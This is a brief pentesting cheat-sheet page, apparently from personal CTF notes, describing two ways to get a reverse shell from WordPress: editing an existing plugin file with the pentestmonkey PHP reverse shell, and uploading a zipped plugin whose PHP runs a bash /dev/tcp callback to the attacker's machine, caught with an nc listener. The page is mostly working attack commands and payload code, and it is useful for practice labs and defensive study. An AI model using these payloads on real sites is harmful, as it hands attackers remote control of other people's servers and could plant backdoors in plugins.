# Web







## Wordpress

### Reverse Shell #1 - Edit existing Plugin

**Examples**&#x20;

[#initial-shell](../../walkthroughs/tryhackme/wordpress-cve-2021-29447.md#initial-shell "mention")

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```

Update the page with your reverse shell then save. This will make the plugin not appear anymore under Installed Plugins

<figure><img src="../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>

Curl the page to activate it.

**Kali**

```
curl http://$VICTIM/wp-content/plugins/akismet/akismet.php
```

### Reverse Shell  #2 - Upload Plugin

**Examples**&#x20;

[mr-robot-ctf.md](../../walkthroughs/tryhackme/mr-robot-ctf.md "mention")

**revshell.php code**

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```

**Kali**

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```

